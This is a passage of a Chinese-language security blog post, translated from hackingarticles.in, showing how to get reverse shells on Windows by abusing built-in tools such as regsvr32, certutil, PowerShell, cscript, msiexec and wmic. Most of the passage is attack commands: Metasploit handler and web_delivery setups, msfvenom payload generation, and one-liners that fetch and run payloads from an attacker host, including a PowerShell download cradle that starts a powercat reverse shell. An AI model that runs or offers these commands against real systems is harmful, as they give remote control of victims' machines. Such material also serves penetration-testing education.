+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt;<span class="built_in">set</span> target 3</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> lhost 192.168.1.109</span><br><span class="line">msf exploit (web_delivery)&gt;<span class="built_in">set</span> srvhost 192.168.1.109</span><br><span class="line">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>
+
+<p>复制下面窗口中显示的突出显示的文本</p>
+<p><img src="https://i1.wp.com/2.bp.blogspot.com/-p0QEInqkcx8/XERxEfHkFXI/AAAAAAAAcIM/f6J6-fwsWCMa-4fCq5uiLAHZB3gCF-9bgCLcBGAs/s1600/12.png?w=687&ssl=1" alt="img"></p>
+<p>在regsrv32.exe的帮助下，您将在远程计算机上执行scrobj.dll文件，您将在本地计算机（Kali Linux）上获得反向连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://192.168.1.109:8080/xt5dIF.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-OB5nghnOldk/XERxEnRo8GI/AAAAAAAAcIU/2wefsko02AElgdWTQJZeWLjo3cYUFhBLQCLcBGAs/s1600/13.png?w=687&ssl=1" alt="img"></p>
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i2.wp.com/3.bp.blogspot.com/-_ix5g4_sjyQ/XERxEQYpoyI/AAAAAAAAcIQ/Xu9F9xQFugMGM0-dTZHfqbR9szpv6K3fgCLcBGAs/s1600/14.png?w=687&ssl=1" alt="img"></p>
+<h2 id="四、Certutil-exe"><a href="#四、Certutil-exe" class="headerlink" title="四、Certutil.exe"></a>四、Certutil.exe</h2><p>Certutil.exe是一个命令行程序，作为证书服务的一部分安装。我们可以使用此工具在目标计算机上执行我们的恶意<strong>exe文件</strong>以获取meterpreter会话。</p>
+<p><strong>通过Msfvenom启动certutil攻击</strong></p>
+<p>使用msfvenom生成恶意可执行（.exe）文件并<strong>启动multi / handler</strong>以获取受害者计算机的反向shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p> <strong><img src="https://i1.wp.com/4.bp.blogspot.com/-u4xQqtgWTyY/XERxE1CnEoI/AAAAAAAAcIY/gbDs9afuMVEdYu4CmTBD1dFAVV0X5WXWgCLcBGAs/s1600/19.png?w=687&ssl=1" alt="img"></strong></p>
+<p>现在，为了使用certutil转储shell.exe文件的配置信息或文件，您可以按照以下systax：</p>
+<p><em>语法：[ - f] [-urlcache] [-split]可执行文件的路径</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe &amp; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-bDtjVsVqCfI/XERxFnef2HI/AAAAAAAAcIg/2lWy09_8hCUan9rgSBKoSPXf98Dq4uCwwCLcBGAs/s1600/20.png?w=687&ssl=1" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.109</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1234</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-kzB3IOsqd7E/XERxFqRFN-I/AAAAAAAAcIk/EGkn94fq-WsFUDnMc3K3981c0psvCnYowCLcBGAs/s1600/21.png?w=687&ssl=1" alt="img"></p>
+<h2 id="五、Powershell-exe"><a href="#五、Powershell-exe" class="headerlink" title="五、Powershell.exe"></a>五、Powershell.exe</h2><p>您可以使用PowerShell.exe从其他工具（如Cmd.exe）的命令行启动PowerShell会话，或者在PowerShell命令行中使用它来启动新会话。从<a href="https://docs.microsoft.com/en-us/powershell/scripting/components/console/powershell.exe-command-line-help?view=powershell-6" target="_blank" rel="noopener">这里</a>阅读Microsoft Windows官方网站上的更多内容。</p>
+<p><strong>通过Powershell启动Powercat攻击</strong></p>
+<p>Powercat是一个PowerShell本机后门监听器和反向shell，也称为netcat的修改版本，因为它集成了对生成编码有效负载的支持，msfvenom会这样做，并且还有一个客户端到客户端中继，这是Powercat客户端的一个术语。允许连接两个独立的侦听器。</p>
+<p>在本地机器上下载powershell，然后使用python http服务器下载powercat.ps1传输文件以获取目标的反向shell，如下所示，并<strong>启动netcat listener</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.wp.com/4.bp.blogspot.com/-w3C510CQUwc/XERxGDKDzWI/AAAAAAAAcIo/t7-aghYUo7EMgY6zJp71jfELNm85oIhXgCLcBGAs/s1600/24.png?w=687&ssl=1" alt="img"></p>
+<p>然后在远程端执行以下命令以获取natcat会话。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-AuWS47ZUX7M/XERxGKIaPjI/AAAAAAAAcIw/t2eKFIIM9Go94YdhULnl25q0ESt8k5bjwCLcBGAs/s1600/25.png?w=687&ssl=1" alt="img"></p>
+<p>你可以观察到，我们有受害者的netcat会话，如下所示：</p>
+<p><img src="https://i1.wp.com/4.bp.blogspot.com/-pUe8murtpZ8/XERxGFr0IdI/AAAAAAAAcIs/DE_vK8GP4kYQUGTVRsYeQL7f7UP54Z9vwCLcBGAs/s1600/26.png?w=687&ssl=1" alt="img"></p>
+<h2 id="六、批处理文件"><a href="#六、批处理文件" class="headerlink" title="六、批处理文件"></a><strong>六、批处理文件</strong></h2><p>同样，powershell允许客户端执行<strong>bat文件</strong>，因此让我们使用msfvenom生成恶意bat文件，如下所示，并启动netcat监听器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 &gt; 1.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.wp.com/1.bp.blogspot.com/-OdUOi3cMRQs/XERxGnqbssI/AAAAAAAAcI0/SEKI54JsGeYJXEibvsA_6tlJh0k5qiDFwCLcBGAs/s1600/27.png?w=687&ssl=1" alt="img"></p>
+<p>然后在远程端执行以下命令以获取natcat会话。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">"IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-0CmovKHOJrM/XERxHCRIPnI/AAAAAAAAcI4/ObUMBfxp2uk-erbTVLlt3Dw9XuzTBBkCACLcBGAs/s1600/28.png?w=687&ssl=1" alt="img"></p>
+<p>你可以观察到，我们有受害者的netcat会话，如下所示：</p>
+<p><img src="https://i1.wp.com/1.bp.blogspot.com/-4Mnl67YAD6s/XERxH_3GZjI/AAAAAAAAcJA/Uvop5v5QilMx_yYqc65rFYT7oVLhg5uvgCLcBGAs/s1600/29.png?w=687&ssl=1" alt="img"></p>
+<h2 id="七、CSCRIPT"><a href="#七、CSCRIPT" class="headerlink" title="七、CSCRIPT"></a><strong>七、CSCRIPT</strong></h2><p>同样，powershell允许客户端执行<strong>cscript.exe</strong>来运行<strong>wsf，js</strong>和<strong>vbs</strong>脚本，因此让我们使用msfvenom生成恶意bat文件，如下所示，并启动multi / handler作为监听器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs &gt; 1.vbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/1.bp.blogspot.com/-pBOo1dseDgE/XERxH0We7tI/AAAAAAAAcJE/5RCKtv1aKGAfV7zFzqYUY1Xjh61G7ALbwCLcBGAs/s1600/30.1.png?w=687&ssl=1" alt="img"></p>
+<p>然后在远程端执行以下命令以获取meterpreter会话。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">");Start-Process %windir%\system32\cscript.exe \"</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">""</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/1.bp.blogspot.com/-PvnGPj2GVGA/XERxIFksOFI/AAAAAAAAcJI/4yLhVGVqkvg_pnQgLq0fKjejrLkjpF_jgCLcBGAs/s1600/30.2.png?w=687&ssl=1" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.109</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1234</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i0.wp.com/2.bp.blogspot.com/-aymk9tuvy9g/XERxImvP91I/AAAAAAAAcJM/De-FehRxf4s7irNF2M7VFA8m8Am1KJxrgCLcBGAs/s1600/30.3.png?w=687&ssl=1" alt="img"></p>
+<h2 id="八、msiexec-exe"><a href="#八、msiexec-exe" class="headerlink" title="八、msiexec.exe"></a>八、msiexec.exe</h2><p>我们都知道Windows操作系统安装了Windows Installer引擎，<strong>MSI软件包</strong>  使用该引擎来  安装应用程序。解释包和安装产品的可执行程序是Msiexec.exe。</p>
+<p><strong>通过msfvenom启动msiexec攻击</strong></p>
+<p>让我们使用Windows Meterpreter有效负载生成一个MSI包文件（1.msi），如下所示，并启动multi / handler作为监听器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f  msi &gt; 1.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.wp.com/3.bp.blogspot.com/-vGSOtlKLyf8/XERxIg5stDI/AAAAAAAAcJU/v6tyxgZArS4nnRoEPCUeyU1Nq3kRug3ZgCLcBGAs/s1600/30.png?w=687&ssl=1" alt="img"></p>
+<p>一旦您在msiexec的帮助下在远程计算机上执行1.msi文件，您将在本地计算机（Kali Linux）上获得反向连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://192.168.1.109/1.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-8GkhktI-SyM/XERxIgj3uCI/AAAAAAAAcJQ/rRqB1uqd1DYLxa8iC7Gb-wOeqmdt1Jx4wCLcBGAs/s1600/31.png?w=687&ssl=1" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.109</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1234</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i2.wp.com/1.bp.blogspot.com/-Q9pZ_B32-vQ/XERxI4lTSlI/AAAAAAAAcJY/Tb_i1u2XXBUFsmhQJlP_KIcIMK2Hl9OBgCLcBGAs/s1600/32.png?w=687&ssl=1" alt="img"></p>
+<h2 id="九、Wmic-exe"><a href="#九、Wmic-exe" class="headerlink" title="九、Wmic.exe"></a>九、Wmic.exe</h2><p>WMIC实用程序是Microsoft工具，提供WMI命令行界面，用于本地和远程计算机的各种管理功能，还用于本地或远程的系统设置，停止进程和执行脚本等wmic查询。因此，它可以调用<strong>XSL脚本</strong>（可扩展样式表语言）。</p>
+<p><strong>通过Koadic发起Wmic.exe攻击</strong></p>
+<p>现在将在koadic的帮助下生成恶意XSL文件，这是一个命令和控制工具，与Metasploit和Powershell Empire非常相似。</p>
+<p>要了解koadic如何工作，请阅读我们的文章：<a href="https://www.hackingarticles.in/koadic-com-command-control-framework/" target="_blank" rel="noopener">https://www.hackingarticles.in/koadic-com-command-control-framework/</a></p>
+<p>安装完成后，您可以运行  <strong>./koadic</strong>  文件以启动koadic并开始加载sta / js / wmic stager，方法是运行以下命令并设置SRVHOST，其中stager应该调用home。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use stager/js/wmic</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-Vr3Ajw9K7VE/XERxJ51_aTI/AAAAAAAAcJg/yjMRQ_m7kDM3-eb4F30bjGCmUYRNnMnjQCLcBGAs/s1600/36.png?w=687&ssl=1" alt="img"></p>
+<p>执行WMIC以下命令从远程服务器下载并运行恶意XSL文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:<span class="string">"http://192.168.1.107:9996/g8gkv.xsl"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-128j7cQgiIw/XERxJrwmPDI/AAAAAAAAcJc/E6fOncwHWFkqByePbnTMoWstqBamuaL3wCLcBGAs/s1600/37.png?w=687&ssl=1" alt="img"></p>
+<p>一旦恶意XSL文件在目标机器上执行，您就会 像metasploit一样拥有  <strong>Zombie连接</strong>。</p>
+<p><img src="https://i0.wp.com/3.bp.blogspot.com/-L7nvBm5Sd48/XERxKDpMKhI/AAAAAAAAcJk/R8u8I_loOnkqUvRf1pqXZ3K6ZRxv2O90wCLcBGAs/s1600/38.png?w=687&ssl=1" alt="img"></p>
+<p>本文翻译自 hackingarticles.in， <a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" target="_blank" rel="noopener">原文链接</a> 。如若转载请注明出处。</p>
+<p>reference:<br><a href="http://www.secist.com/archives/7195.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://www.secist.com/archives/7195.html?tdsourcetag=s_pctim_aiomsg</a></p>
+<p><a href="https://bbs.silic.wiki/thread-3039-1-1.html" target="_blank" rel="noopener">求助] Apache 2.2.14 mod_isapi Dangling Pointer漏洞用法</a></p>
+<p><a href="http://www.secist.com/archives/4809.html" target="_blank" rel="noopener">我的shellcode编写之路</a></p>
+<p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">渗透攻防工具篇-后渗透阶段的Meterpreter</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/23/2019-1-23-后渗透详解/" title="后渗透详细篇">https://wh0ale.github.io/2019/01/23/2019-1-23-后渗透详解/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i># bypass</a>
+          
+            <a href="/tags/后渗透/" rel="tag"><i class="fa fa-tag"></i># 后渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/23/2019-1-23-免杀方法大集合/" rel="next" title="免杀方法大集结">
+                <i class="fa fa-chevron-left"></i> 免杀方法大集结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/24/2019-1-24-Https建立连接/" rel="prev" title="https建立连接">
+                https建立连接 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-免杀技术"><span class="nav-number">1.</span> <span class="nav-text">0x01 免杀技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、dll-免杀"><span class="nav-number">1.1.</span> <span class="nav-text">一、dll 免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、custom-command-dll"><span class="nav-number">1.2.</span> <span class="nav-text">二、custom_command_dll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、总结"><span class="nav-number">1.3.</span> <span class="nav-text">三、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-下载文件的dll"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 下载文件的dll</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-加密"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-HTTPS"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 HTTPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-dns-txt"><span class="nav-number">1.3.4.</span> <span class="nav-text">3.4 dns_txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-动态注入"><span class="nav-number">1.3.5.</span> <span class="nav-text">3.5 动态注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-第三方分离免杀"><span class="nav-number">1.3.6.</span> <span class="nav-text">3.6 第三方分离免杀</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-bypass-360"><span class="nav-number">2.</span> <span class="nav-text">0x02 bypass_360</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、AMSI-bypass"><span class="nav-number">2.1.</span> <span class="nav-text">一、AMSI_bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Invoke-Obfuscation-psd1"><span class="nav-number">2.2.</span> <span class="nav-text">二、Invoke-Obfuscation.psd1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、stager-dll-master"><span class="nav-number">2.3.</span> <span class="nav-text">三、stager.dll-master</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-bypass-uac"><span class="nav-number">3.</span> <span class="nav-text">0x03 bypass_uac</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、cmstp-exe作为绕过UAC"><span class="nav-number">3.1.</span> <span class="nav-text">一、cmstp.exe作为绕过UAC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、DKMC"><span class="nav-number">3.2.</span> <span class="nav-text">二、DKMC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-get-reverse-shell"><span class="nav-number">4.</span> <span class="nav-text">0x04 get-reverse-shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Mshta-exe"><span class="nav-number">4.1.</span> <span class="nav-text">一、Mshta.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、RUNDLL32-EXE"><span class="nav-number">4.2.</span> <span class="nav-text">二、RUNDLL32.EXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、Regsvr32-exe"><span class="nav-number">4.3.</span> <span class="nav-text">三、Regsvr32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、Certutil-exe"><span class="nav-number">4.4.</span> <span class="nav-text">四、Certutil.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、Powershell-exe"><span class="nav-number">4.5.</span> <span class="nav-text">五、Powershell.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、批处理文件"><span class="nav-number">4.6.</span> <span class="nav-text">六、批处理文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、CSCRIPT"><span class="nav-number">4.7.</span> <span class="nav-text">七、CSCRIPT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、msiexec-exe"><span class="nav-number">4.8.</span> <span class="nav-text">八、msiexec.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#九、Wmic-exe"><span class="nav-number">4.9.</span> <span class="nav-text">九、Wmic.exe</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
